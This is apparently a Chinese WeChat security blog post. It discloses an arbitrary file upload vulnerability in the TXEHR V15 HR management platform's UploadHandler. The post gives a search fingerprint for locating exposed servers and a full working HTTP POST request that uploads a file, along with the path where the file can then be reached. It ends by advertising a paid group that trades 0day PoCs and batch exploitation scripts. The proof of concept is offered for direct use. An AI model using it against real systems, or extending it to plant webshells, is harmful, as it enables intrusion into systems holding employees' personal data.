#  【0day】同享TXEHR V15人力管理管理平台UploadHandler存在任意文件上传漏洞   
小白菜安全  小白菜安全   2024-08-01 21:58  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞描述  
  
  
同享软件成立于1997年，运营中心位于东莞南城南新产业国际。专注研发和推广人力资源信息化产品，帮助企业构建统一的人力资源数智化平台，快速提高企业人才管理能力，提升人力资源管理效率，帮助员工快速成长，协助企业实现智慧决策。同享TXEHR V15人力管理管理平台UploadHandler存在任意文件上传漏洞。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
资产信息  
  
  
body="/Assistant/Default.aspx"  
  
像不像莫宝oa。。。。。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia08KbWvU4Xjn8ibP3ab8TI5DvQSWV2tsCKHoUziaUicN2afx6WQKfPPktzhJ5edJ1h41rouxetViayWSQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞复现  
  
  
  
POST /Handler/UploadHandler.ashx?folder=Uploadfile2 HTTP/1.1  
  
Host:   
  
accept: */*  
  
Content-Type: multipart/form-data; boundary=---------------------------123  
  
Content-Length: 226  
  
Upgrade-Insecure-Requests: 1  
  
Sec-Fetch-Dest: document  
  
Sec-Fetch-Mode: navigate  
  
Sec-Fetch-Site: same-origin  
  
Sec-Fetch-User: ?1  
  
Te: trailers  
  
Connection: close  
  
  
-----------------------------123  
  
Content-Disposition: form-data; name="Filedata"; filename="123.jpg"  
  
Content-Type: text/plain  
  
  
safdsfsfaa  
  
-----------------------------123--  
  
  
  
url+/Handler/Uploadfile2/123.jpg  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/NhLcT1kxlia08KbWvU4Xjn8ibP3ab8TI5DDbXpuZPftibx7tWF321icpG0g12cpaJJRpORtjwNfUn8w45mRzTVibLag/640?wx_fmt=other&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
圈子推荐  
  
  
‍  
‍  
高  
质量安全社区，每天至少更新一个0Day/Nday/1day漏洞POC，互联网上各种安全工具整合以及更新维护，  
后期圈子还会自研工具并分享。高质量的漏洞文库可以给师傅们在护网以及SRC中提供帮助。  
  
**【圈子相关】**  
  
**********1.本圈每日更新最新互联网公开/未公开1day**  
  
**2.不定期更新0day poc**  
  
**3.分享各种安全工具并实时对工具更新维护**  
  
**4.不定期对漏洞进行整合并发布批量验证脚本（目前基于nuclei实现，且关注重点系统：如OA\海康等）**  
  
**5.圈子专属漏洞文库，每日也会更新POC（最近2024护网漏洞也在持续更新）**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgKfFKb0hCzdZ1PIze423fNQJlBDwGTZLhzlPh8icxw0BlnfCwtEAyuTA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia08KbWvU4Xjn8ibP3ab8TI5DHkNBmfaDmhCTJsdCR3b0kOey5J8fjHHdNtaI9ooOf1vj57QzAlMAibg/640?wx_fmt=png&from=appmsg "")  
  
**6.微信交流圈，**  
前100名师傅享20优惠哦，先到先得  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/NhLcT1kxlia3pHYZxSQ16eMVVb5wV79ASKiaotOcWW0fCFR8QibI8YekuubOaCSJW2kKaJL4Q6Ns0E6BodL2UwpGw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgOaSVwdVAPT7DWSKK7pjSWGdbQKWEM0yTB3JSqNxLUnEBesOW8eG40w/640?wx_fmt=png&from=appmsg "")  
  
免责声明  
  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgAth2WTu4kyEzL1Dia7AXUWcP7tsbHDtpaH1cls1lJTPVNE6XTwLYvJg/640?wx_fmt=gif&from=appmsg "")  
  
  
  
